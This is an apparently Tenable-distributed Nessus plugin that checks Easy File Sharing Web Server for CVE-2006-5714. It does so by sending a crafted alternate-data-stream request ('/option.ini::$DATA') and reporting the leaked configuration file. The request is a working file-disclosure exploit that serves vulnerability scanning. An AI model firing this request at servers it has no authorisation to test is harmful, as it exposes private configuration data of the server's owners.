#
#	This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#

# Changes by Tenable:
# - Changed plugin family (8/14/09)

include("compat.inc");

if (description)
{
	# set script identifiers
	script_id(23636);
	script_version("$Revision: 1.17 $");
	
	script_cve_id("CVE-2006-5714");
	script_bugtraq_id(20823);
	script_osvdb_id(30150);
	script_xref(name:"EDB-ID", value:"2690");

	script_name(english:"Easy File Sharing Web Server Crafted Request ADS Arbitrary File Access");
	script_summary(english:"Tries to read a local file via EFS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of Easy File Sharing Web Server that is installed on the
remote host fails to restrict access to files via alternative data
streams.  By passing a specially crafted request to the web server, an
attacker may be able to access privileged information." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/11/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/10/30");
 script_cvs_date("$Date: 2016/05/20 13:54:16 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

	script_category(ACT_ATTACK);
	script_copyright(english:"This script is Copyright (C) 2006-2016 Justin Seitz");
	script_family(english:"Web Servers");

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 80);
	exit(0);

}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

#
#	Verify we can talk to the web server, if not exit
#
port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if (!banner || "Server: Easy File Sharing Web Server" >!< banner) exit(0);

#
#	We are sending an encoded request for /options.ini::$DATA to the web server.
#
attackreq = http_get(item:urlencode(str:"/option.ini::$DATA"),port:port);
attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
if (attackres == NULL) exit(0);

if ("[Server]" >< attackres) {
	info = string("Here are the contents of the 'options.ini' configuration file\n",
	"from the remote host: \n\n",attackres);
		
	security_warning(port:port, extra: info);
}
